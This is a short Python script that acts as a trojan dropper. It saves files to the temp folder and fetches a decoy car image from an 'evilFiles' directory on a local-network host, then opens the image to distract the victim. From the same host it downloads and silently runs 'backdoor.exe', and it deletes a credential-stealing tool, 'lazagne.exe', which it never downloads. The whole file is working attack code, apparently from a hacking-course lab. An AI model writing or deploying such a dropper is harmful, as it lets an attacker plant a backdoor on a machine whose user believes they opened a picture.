#!/usr/bin/env python

import subprocess, requests, os, tempfile

def download(url):
    get_response = requests.get(url)
    # print(get_response.content)
    fileName = url.split("/")[-1] #name file as the end of url string
    # print(fileName)
    with open(fileName, "wb") as output:
        output.write(get_response.content)



temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("http://10.0.2.4/evilFiles/aston-martin-dbz.jpg")
# subprocess.run("sudo chmod +x lazagne.exe", shell=True)
command = "aston-martin-dbz.jpg " #sys command for windows machines
result = subprocess.Popen(command, shell=True)

download("http://10.0.2.4/evilFiles/backdoor.exe")
subprocess.call("backdoor.exe", shell=True)
os.remove("lazagne.exe")
